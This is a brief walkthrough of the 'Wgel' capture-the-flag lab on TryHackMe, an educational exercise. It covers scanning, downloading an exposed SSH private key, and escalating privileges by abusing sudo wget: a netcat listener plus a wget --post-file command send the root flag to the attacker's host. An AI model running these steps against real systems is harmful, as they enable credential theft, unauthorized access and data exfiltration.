Wgel CTF

TryHackMe, Easy

Wgel chains the discovery of an SSH key exposed in a hidden directory of the web server and privilege escalation abusing sudo wget per GTFOBins.

Reconnaissance

Nmap reveals SSH and HTTP. A comment in the page source mentions user jessie. Enumeration finds the /sitemap/ directory, exposing a .ssh folder with the private key.

nmap -sS -sV -Pn <IP>
gobuster dir -u http://<IP> -w big.txt
gobuster dir -u http://<IP>/sitemap -w big.txt
curl http://<IP>/sitemap/.ssh/id_rsa -o id_rsa

Foothold

With the key, we authenticate over SSH as jessie and locate the user flag.

chmod 600 id_rsa
ssh -i id_rsa jessie@<IP>
find / -name user.txt 2>/dev/null

Escalation - sudo wget (GTFOBins)

sudo -l shows jessie may run /usr/bin/wget as root. Via GTFOBins, use --post-file to exfiltrate the root flag to the attacker's listener (or, alternatively, overwrite /etc/passwd).

sudo -l
# on attacker:
nc -lvnp 4444
# on victim:
sudo /usr/bin/wget --post-file=/root/root.txt http://<MY_IP>:4444
